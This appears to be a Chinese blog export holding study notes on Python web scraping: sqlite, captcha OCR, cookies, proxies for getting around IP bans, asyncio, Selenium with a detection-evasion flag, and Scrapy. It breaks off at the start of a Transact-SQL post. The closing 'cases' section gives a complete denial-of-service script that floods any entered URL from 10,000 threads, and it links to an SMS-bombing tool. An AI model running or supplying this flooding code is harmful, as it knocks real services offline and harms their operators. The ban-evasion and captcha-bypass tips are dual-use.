= json.loads(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><h3 id="2-excel"><a href="#2-excel" class="headerlink" title="2 excel"></a>2 excel</h3><h3 id="3-sqlite"><a href="#3-sqlite" class="headerlink" title="3 sqlite"></a>3 sqlite</h3><blockquote><p>可以下载插件Database Navigator对数据库进行查看。</p><p>初次下载后DB browser会出现在软件左侧，Database是PyCharm专业版自带的。</p><p>新建数据库点击”+”号，然后找到Connection中的Database files，添加路径。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开或创建数据库文件</span></span><br><span class="line">conn = sqlite3.connect(<span class="string">&quot;name.db&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取游标</span></span><br><span class="line">p = conn.cursor()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行sql语句</span></span><br><span class="line">sql = <span class="string">&quot;&quot;</span></span><br><span class="line">res = p.execute(sql)</span><br><span class="line"><span class="comment"># 参数化执行</span></span><br><span class="line">res = p.execute(<span class="string">&quot;INSERT INTO public_key (pubkey) VALUES (?)&quot;</span>, (public_key,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取查询结果集中的所有数据</span></span><br><span class="line">rows = cursor.fetchall()</span><br><span class="line"><span class="comment"># 用于获取查询结果集中的下一行数据</span></span><br><span class="line">p.fetchone()</span><br><span class="line"></span><br><span class="line"><span class="comment"># select的结果可以按如下方法查看</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;id = &quot;</span>,row[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;name = &quot;</span>,row[<span class="number">1</span>])</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交数据库</span></span><br><span class="line">conn.commit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭链接</span></span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><hr><h2 id="五、身份认证"><a href="#五、身份认证" class="headerlink" title="五、身份认证"></a>五、身份认证</h2><h3 id="1-验证码"><a href="#1-验证码" class="headerlink" title="1 验证码"></a>1 验证码</h3><blockquote><p>步骤：</p><ol><li>下载验证码图片到本地。</li><li>识别验证码。</li><li>上传结果登入成功。（登入成功的post请求中带有验证码参数，进行修改）</li></ol><p>响应状态码：<code>res = response.status_code</code>（200为成功）</p><p>高级验证：使用超级鹰。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 简单验证</span></span><br><span class="line">pip install ddddocr</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line">ocr = ddddocr.DdddOcr()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    img_bytes = f.read()</span><br><span class="line">res = ocr.classification( img_bytes )</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h3 id="2-Cookie"><a href="#2-Cookie" class="headerlink" title="2 Cookie"></a>2 Cookie</h3><blockquote><p>Http数据包：Request Headers——Cookie     </p><p>手动Cookie：<code>headers = &#123; &quot;cookie&quot;:&quot;value&quot; &#125;</code></p><p>自动Cookie：模拟登入post请求后，由服务器创建。</p><p>session会话对象：</p><ol><li>可以进行请求的发送。</li><li>如果请求过程中产生了cookie，则该 cookie 会被自动存储 / 携带在该 session 对象中。</li></ol><p>session使用：</p><ol><li>创建session对象：<code>session = requests.Session()</code></li><li>使用session对象进行模拟登入（找到是哪个 url 设置了 cookie 值（<code>set-cookie</code>））：<code>session.post()</code>（参数同requests）</li><li>session对象对目标进行get请求（携带了cookie）：<code>session.get()</code>（参数同requests）</li></ol></blockquote><h3 id="3-代理"><a href="#3-代理" class="headerlink" title="3 代理"></a>3 代理</h3><blockquote><p>目的：破解封IP反爬机制。</p><p>作用：突破IP访问限制，伪装IP。</p><p>使用：<code>requests.get/post(proxies = &#123;&quot;type&quot;:&quot;IP:Port&quot;&#125;)</code>（type：类型）</p><p>代理 IP 透明度：</p><ul><li>透明：服务器知道该次请求使用了代理，也知道请求对应的真真实IP。</li><li>匿名：服务器知道使用了代理，不知道真实IP。</li><li>高匿：服务器不知道使用了代理和IP地址。</li></ul></blockquote><hr><h2 id="六、高性能异步爬虫"><a href="#六、高性能异步爬虫" class="headerlink" title="六、高性能异步爬虫"></a>六、高性能异步爬虫</h2><h3 id="1-多线程、多进程"><a href="#1-多线程、多进程" class="headerlink" title="1 多线程、多进程"></a>1 多线程、多进程</h3><blockquote><p>不建议使用。</p><p>特点：</p><ul><li>优势：可以为相关阻塞的操作单独开启线程或者进程，阻塞操作救可以异步执行。</li><li>劣势：无法无限制的开启多线程或者多进程，比较耗费资源，会乱序。</li></ul></blockquote><h3 id="2-线程池、进程池"><a href="#2-线程池、进程池" class="headerlink" title="2 线程池、进程池"></a>2 线程池、进程池</h3><blockquote><p>适当使用。</p><p>特点：</p><ul><li>优势：可以降低系统对进程或者线程创建和销毁的一个频率，从而很好地降低系统的开销。</li><li>劣势：池中线程或进程的数量有上限，会乱序。</li><li>使用：线程池应应用于阻塞且耗时的操作。</li></ul></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一个线程池中创建几个线程对象</span></span><br><span class="line">pool = Pool(num)</span><br><span class="line"><span class="comment"># 为函数异步执行可迭代对象，返回值是函数的返回值（一个列表）</span></span><br><span class="line">pool.<span class="built_in">map</span>(func,iterable)</span><br><span class="line"><span class="comment"># 关闭线程池</span></span><br><span class="line">pool.close()</span><br><span class="line"><span class="comment"># 主线程结束后子线程结束</span></span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure><ul><li><p>==案例==</p><blockquote><p>B站UP主岚山蓝啊的专栏</p></blockquote></li></ul><h3 id="3-单线程-异步协程"><a href="#3-单线程-异步协程" class="headerlink" title="3 单线程 + 异步协程"></a>3 单线程 + 异步协程</h3><blockquote><p>推荐使用。</p></blockquote><div class="table-container"><table><thead><tr><th>对象或方法</th><th>解释</th></tr></thead><tbody><tr><td>event_loop</td><td>事件循环，相当于一个无限循环，我们可以把一些函数注册到这个事件循环上，当满足某些条件的时候，函数就会被循环执行</td></tr><tr><td>coroutine</td><td>协程对象，我们可以将协程对象注册到事件循环中，它会被事件循环调用。我们可以使用</td></tr><tr><td>async</td><td>定义一个方法，这个方法在调用时不会立即被执行，而是返回一个协程对象</td></tr><tr><td>task</td><td>任务，它是对协程对象的进一步封装，包含了任务的各个状态</td></tr><tr><td>future</td><td>代表将来执行或还没有执行的任务，实际上和 task没有本质区别</td></tr><tr><td>async</td><td>定义一个协程</td></tr><tr><td>await</td><td>用来挂起阻塞方法的执行</td></tr></tbody></table></div><p>单任务使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义协程</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">re</span>(<span class="params">url:<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Doing url&quot;</span>,url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = re(<span class="string">&quot;[www.baidu.com](http://www.baidu.com/)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个事件循环对象并执行</span></span><br><span class="line">loop = asyncio.new_event_loop()</span><br><span class="line">asyncio.set_event_loop(loop)</span><br><span class="line">loop.run_until_complete(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接启动协程</span></span><br><span class="line">asyncio.run(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 封装到 task 中</span></span><br><span class="line">loop = asyncio.new_event_loop()</span><br><span class="line">asyncio.set_event_loop(loop)</span><br><span class="line">task = loop.create_task(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 封装到 future 中</span></span><br><span class="line">loop = asyncio.new_event_loop()</span><br><span class="line">asyncio.set_event_loop(loop)</span><br><span class="line">task = asyncio.ensure_future(c,loop=loop)</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定回调（task执行成功后会自动执行回调函数，参数为 task ）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback_func</span>(<span class="params">task</span>):</span><br><span class="line">    <span class="built_in">print</span>(task.result())  <span class="comment">#  task 绑定的函数的返回值</span></span><br><span class="line">loop = asyncio.new_event_loop()</span><br><span class="line">asyncio.set_event_loop(loop)</span><br><span class="line">task = asyncio.ensure_future(c,loop=loop)</span><br><span class="line">task.add_done_callback(callback_func)</span><br><span class="line">loop.run_until_complete(task)</span><br></pre></td></tr></table></figure><p>多任务使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">url:<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Downloading&quot;</span>,url,<span class="string">&quot;...&quot;</span>)</span><br><span class="line">    <span class="comment"># 异步协程不能有同步模块代码，所以不能用 time.sleep(2)，否则不会异步</span></span><br><span class="line">    <span class="comment"># 在 asyncio 遇到的阻塞操作必须手动挂起，不然会报错</span></span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;OK for&quot;</span>,url)</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line">urls = [<span class="string">&quot;www.baidu.com&quot;</span>,<span class="string">&quot;www.sogou.com&quot;</span>,<span class="string">&quot;www.google.com&quot;</span>]</span><br><span class="line">loop = asyncio.new_event_loop()</span><br><span class="line">asyncio.set_event_loop(loop)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存放多个任务对象</span></span><br><span class="line">stasks = []</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">    c = request(url)</span><br><span class="line">    task = asyncio.ensure_future(c,loop=loop)</span><br><span class="line">    stasks.append(task)</span><br><span class="line"><span class="comment"># 多任务对象列表需要封装到 wait 中</span></span><br><span class="line">loop.run_until_complete(asyncio.wait(stasks))</span><br><span class="line"><span class="built_in">print</span>(time.time()-start)</span><br></pre></td></tr></table></figure><p>flask框架搭建网页</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_main</span>():</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>aiohttp模块</p><blockquote><p>因为<code>resquests.get()</code>是基于同步，所以基于异步需要 <code>aiohttp</code> 模块</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">url:<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Downloading... &quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="comment"># 参数同requests.get()，post()同理</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">            <span class="comment"># 不挂起会异常，或者不用函数，直接text</span></span><br><span class="line">            page_text = <span class="keyword">await</span> response.text()</span><br><span class="line">            <span class="built_in">print</span>(page_text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished&quot;</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="七、自动化"><a href="#七、自动化" class="headerlink" title="七、自动化"></a>七、自动化</h2><h3 id="1-selenium模块"><a href="#1-selenium模块" class="headerlink" title="1 selenium模块"></a>1 selenium模块</h3><blockquote><p>API：<a href="https://www.cnblogs.com/guanyuan12/p/16853991.html">键鼠操作</a></p><p>驱动下载：</p><ul><li><a href="https://chromedriver.storage.googleapis.com/index.html">google下载</a></li><li><a href="https://blog.csdn.net/weixin_45532870/article/details/108686827">驱动与版本映射关系（网盘有）</a></li><li><a href="https://googlechromelabs.github.io/chrome-for-testing/#stable">116-118版本</a></li></ul><p>等待</p><ul><li><p><a href="https://www.cnblogs.com/chushujin/p/12307746.html">隐式等待</a></p></li><li><p><code>driver.implicitly_wait(time_to_wait=10)</code>（界面全部加载完成后才会向下执行代码，超出时间则抛出异常）</p></li></ul></blockquote><p>使用驱动</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用驱动</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line">ser = Service(<span class="string">r&quot;./chromedriver.exe&quot;</span>)</span><br><span class="line">bro = webdriver.Chrome(service = ser)</span><br></pre></td></tr></table></figure><p>简单使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 简单使用</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开浏览器</span></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line"><span class="comment"># 打开的网址</span></span><br><span class="line">driver.get(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="comment"># 获得源码</span></span><br><span class="line">text = driver.page_source</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="comment"># 通过元素找标签，元素选择在 By 类中</span></span><br><span class="line">input_tag = driver.find_element(by,value)</span><br><span class="line"><span class="comment"># 设置标签值</span></span><br><span class="line">input_tag.send_keys()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys <span class="comment"># 键盘操作</span></span><br><span class="line"><span class="comment"># 键盘操作</span></span><br><span class="line">send_keys( Keys.ENTER )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains <span class="comment"># 鼠标操作</span></span><br><span class="line"><span class="comment"># 鼠标操作</span></span><br><span class="line">ActionChains(driver).click(input_tag).perform()</span><br><span class="line"><span class="comment"># 左键单击</span></span><br><span class="line">input_tag.click()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 回退</span></span><br><span class="line">driver.back() </span><br><span class="line"><span class="comment"># 前进</span></span><br><span class="line">driver.forward() </span><br><span class="line"><span class="comment">#退出</span></span><br><span class="line">driver.quit() </span><br></pre></td></tr></table></figure><p>定位</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定位位置</span></span><br><span class="line"><span class="comment"># 切换定位到指定 id 的 iframe 中</span></span><br><span class="line">iframe：driver.switch_to.frame(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 浏览器中元素中的某一点定位</span></span><br><span class="line">ActionChains(bro).move_to_element_with_offset(tag,x,y).click().perform()</span><br></pre></td></tr></table></figure><p>其他设置</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 无头浏览器（无界面显示）</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line">op = Options()</span><br><span class="line">op.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">op.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line">driver = webdriver.Chrome(options=op)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 老版防检测（不一定有效）</span></span><br><span class="line">op = Options()</span><br><span class="line">op.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>,[<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">driver = webdriver.Chrome(options=op)</span><br></pre></td></tr></table></figure><p>鼠标高级操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拖动</span></span><br><span class="line">action = ActionChains(driver)</span><br><span class="line">action.click_and_hold(tag)    <span class="comment"># 按住</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num) :</span><br><span class="line">    action.move_by_offset(x,y).perform()  <span class="comment"># 位移</span></span><br><span class="line">action.release() <span class="comment"># 释放动作链</span></span><br></pre></td></tr></table></figure><p>其他操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 浏览器</span></span><br><span class="line"><span class="comment"># 整张截图存入 png 中</span></span><br><span class="line">driver.save_screenshot(<span class="string">&quot;.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 组件</span></span><br><span class="line"><span class="comment"># 左上角的坐标（字典key为 x , y）</span></span><br><span class="line">tag.location</span><br><span class="line"><span class="comment"># 大小（字典key为 x , y）</span></span><br><span class="line">tag.size：</span><br></pre></td></tr></table></figure><h3 id="2-图片处理"><a href="#2-图片处理" class="headerlink" title="2 图片处理"></a>2 图片处理</h3><p>Image</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取path中图片</span></span><br><span class="line">im = Image.<span class="built_in">open</span>(path)</span><br><span class="line"><span class="comment"># 指定范围裁剪（tuple：( 左上x，左上y，右下x，右下y)）</span></span><br><span class="line">res = im.crop(<span class="built_in">tuple</span>)</span><br><span class="line"><span class="comment"># 存入到path中</span></span><br><span class="line">res.save(path)</span><br></pre></td></tr></table></figure><hr><h2 id="八、scrapy框架"><a href="#八、scrapy框架" class="headerlink" title="八、scrapy框架"></a>八、scrapy框架</h2><h3 id="1-基础文件"><a href="#1-基础文件" class="headerlink" title="1 基础文件"></a>1 基础文件</h3><h4 id="1-1-基础"><a href="#1-1-基础" class="headerlink" title="1.1 基础"></a>1.1 基础</h4><blockquote><p>安装：<code>pip install scrapy</code></p><p>功能：高性能的持久化存储，异步的数据下载，高性能的数据解析，分布式。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 基本使用</span></span><br><span class="line"><span class="comment"># 在当前路径下创建工程</span></span><br><span class="line">scrapy startproject &lt;name&gt;</span><br></pre></td></tr></table></figure><h4 id="1-2-spiders文件"><a href="#1-2-spiders文件" class="headerlink" title="1.2 spiders文件"></a>1.2 spiders文件</h4><p>命令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># *该文件下必须放置一个爬虫文件*</span></span><br><span class="line"><span class="comment"># 进入工程文件目录</span></span><br><span class="line">cd url</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在spiders中创建一个爬虫文件</span></span><br><span class="line">scrapy genspider &lt;name&gt; &lt;url&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行爬虫（-nolog：无日志显示，-o &lt;path&gt;：持久化存储）</span></span><br><span class="line">scrapy crawl &lt;name&gt;</span><br></pre></td></tr></table></figure><p>类变量</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FirstSpider</span>(scrapy.Spider):</span><br><span class="line">    <span class="comment"># 爬虫文件的名称：就是爬虫源文件的唯一标识</span></span><br><span class="line">    name = <span class="string">&quot;first&quot;</span></span><br><span class="line">    <span class="comment"># 允许的域名：用来限定start_urls中哪些可以被允许发送（不使用直接删除）</span></span><br><span class="line">    <span class="comment"># allowed_domains = [&quot;www.123.sogou.com&quot;]</span></span><br><span class="line">    <span class="comment"># 起始的url列表：存在的url会被scrapy自动进行请求发送</span></span><br><span class="line">    start_urls = [<span class="string">&quot;http://www.123.sogou.com/&quot;</span>]</span><br></pre></td></tr></table></figure><p>数据解析</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用作于数据解析：response参数表示的就是请求成功后对应的响应对象（有多少个url，parse则会被调用多少次）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):  </span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 几乎同理etree，但他返回的是Selector对象，支持管道符</span></span><br><span class="line">res = response.xpath()</span><br><span class="line"><span class="comment"># res解析</span></span><br><span class="line"><span class="comment"># 获得Selector中的data数据（单个返回字符串，列表则返回一个列表，值为每个data的值）</span></span><br><span class="line">res.extract() / get()</span><br><span class="line"><span class="comment"># 获得Selector中的第一个data数据</span></span><br><span class="line">res.extract_first()</span><br></pre></td></tr></table></figure><p>持久化存储</p><blockquote><p>基于终端指令：只可以将parse方法的返回值存储到本地的文件中：</p><ul><li><p>parse 中返回一个列表（可以在列表中套字典）</p></li><li><p><code>scrapy crawl &lt;name&gt; -o &lt;path&gt;</code>：持久化存储（类型只能为’json ‘，’jsonlines’， ‘jl’， ‘csv’，’xml ‘，’marshal’，’pickle ‘）</p></li></ul><p>基于管道流程：</p><ol><li>进行数据解析。</li><li>在item类中定义相关的属性。</li><li>将解析的数据封装存储到item类型的对象。</li><li>将item类型的对象提交给管道进行持久化存储的操作。</li><li>在管道类的process_item中要将其接受到的item对象中存储的数据进行持久化存储操作。</li><li>在配置文件中开启管道。</li></ol><p>item类：items.py</p><p>管道：pipelines.py</p></blockquote><h4 id="1-3-items-py"><a href="#1-3-items-py" class="headerlink" title="1.3 items.py"></a>1.3 items.py</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在item中类定义：</span></span><br><span class="line">&lt;name&gt; = scrapy.Field()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在parse中定义：</span></span><br><span class="line"><span class="keyword">from</span> &lt;project_name&gt;.items <span class="keyword">import</span> &lt;project_name&gt;Item</span><br><span class="line">item = &lt;project_name&gt;Item</span><br><span class="line">item[<span class="string">&#x27;str&#x27;</span>] = &lt;xpath&gt;</span><br><span class="line"><span class="keyword">yield</span> item <span class="comment"># 将item提交给了管道</span></span><br></pre></td></tr></table></figure><h4 id="1-4-pipelines-py"><a href="#1-4-pipelines-py" class="headerlink" title="1.4 pipelines.py"></a>1.4 pipelines.py</h4><blockquote><p>专门处理item对象，每接收到一个item就会被调用一次，item只会给第一个将被执行的管道类。</p><p>管道文件中一个管道类将一组数据存储到一个平台或载体中，所以可以继续定义。（需要在配置文件中加上新加的管道类和优先级）</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line"><span class="comment"># 重写父类方法（仅开启和关闭一次文件）</span></span><br><span class="line"><span class="keyword">class</span>:</span><br><span class="line">    fp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_spider</span>(<span class="params">self,spider</span>):</span><br><span class="line">        self.fp = <span class="built_in">open</span>()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close_spider</span>(<span class="params">self,spider</span>):</span><br><span class="line">        self.fp.close()</span><br><span class="line"><span class="comment"># 主要数据操作</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params">self,item,spider</span>):</span><br><span class="line">        &lt;name&gt; = item[<span class="string">&#x27;str&#x27;</span>]</span><br><span class="line">        self.fp.write()</span><br><span class="line">        <span class="keyword">return</span> item <span class="comment"># 传递给下一个将被执行的管道类</span></span><br></pre></td></tr></table></figure><h4 id="1-5-settings-py"><a href="#1-5-settings-py" class="headerlink" title="1.5 settings.py"></a>1.5 settings.py</h4><blockquote><p>爬虫配置文件</p><p><code>ROBOTSTXT_OBEY = True</code>：遵从robots协议。（false不遵从）</p><p><code>USER_AGENT = &#39;str&#39;</code>：UA伪装。</p><p><code># ITEM_PIPELINES = &#123;&#125;</code>：取消注释打开。（数字为优先级，越小越高，可以写多个管道类）</p><p>添加：<code>LOG_LEVEL = &#39;str&#39;</code>：显示指定类型的日志信息（’ERROR’：错误信息）</p></blockquote><hr><h2 id="八、案例"><a href="#八、案例" class="headerlink" title="八、案例"></a>八、案例</h2><h3 id="1-简单DOS攻击"><a href="#1-简单DOS攻击" class="headerlink" title="1 简单DOS攻击"></a>1 简单DOS攻击</h3><blockquote><p><a href="https://github.com/Magialeaf/Web/tree/main/Attack">my::DOS</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dos</span>(<span class="params">url:<span class="built_in">str</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">    header = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url,headers=header)</span><br><span class="line">        <span class="comment"># print(&quot;Code:%s&quot;%response.status_code)</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;输入网址:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        threading.Thread(target=Dos,args=(url,)).start()</span><br></pre></td></tr></table></figure><h3 id="2-短信轰炸"><a href="#2-短信轰炸" class="headerlink" title="2 短信轰炸"></a>2 短信轰炸</h3><blockquote><p><a href="https://github.com/OpenEthan/SMSBoom">短信轰炸</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Transact——SQL</title>
      <link href="/posts/a0eceee2.html"/>
      <url>/posts/a0eceee2.html</url>
      
        <content type="html"><![CDATA[<h1 id="Transact——SQL"><a href="#Transact——SQL" class="headerlink" title="Transact——SQL"></a>Transact——SQL</h1><hr><h2 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h2><blockquote><p> Transact-SQL就是在标准SQL的基础上进行扩充而推出的SQL Server专用的结构化SQL，引入了程序设计的思想，增强了程序的流程控制语句等。</p></blockquote><hr><h2 id="二、变量"><a href="#二、变量" class="headerlink" title="二、变量"></a>二、变量</h2><blockquote><p>全局变量：全局变量是由系统定义和维护的，用户只能使用预先说明及定义的全局变量。因此，全局变量对于用户来说是只读的。<br>使用全局变量时必须以<code>@@</code>开头。</p><p>局部变量：局部变量是由用户自定义的变量，其名称命名规则同标识符的命名规则，不区分大小写。</p><p>注释符：</p><ul><li><p><code>--</code>：注释一行。</p></li><li><p><code>/**/</code>：注释全部。</p></li></ul></blockquote><p>使用</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1.</span>声明（局部变量必须先声明才可以使用）</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@var</span> type [, <span class="variable">@var</span> type , ...]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># <span class="number">2.</span>赋值</span><br><span class="line"><span class="comment">-- 可以多行赋值，用,隔开</span></span><br><span class="line"><span class="keyword">select</span> <span class="variable">@var</span> <span class="operator">=</span> <span class="keyword">value</span> [, <span class="variable">@var</span> <span class="operator">=</span> <span class="keyword">value</span>  , ...]</span><br><span class="line"><span class="comment">-- 不可以多行赋值</span></span><br><span class="line"><span class="keyword">set</span> <span class="variable">@var</span> <span class="operator">=</span> <span class="keyword">value</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># <span class="number">3.</span>输出</span><br><span class="line">print <span class="variable">@var</span> # print输出是文本输出，而不是一列</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@id</span> <span class="type">char</span>(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="variable">@id</span> <span class="operator">=</span> <span class="string">&#x27;10010001&#x27;</span></span><br></pre></td></tr></table></figure><hr><h2 id="三、运算符"><a href="#三、运算符" class="headerlink" 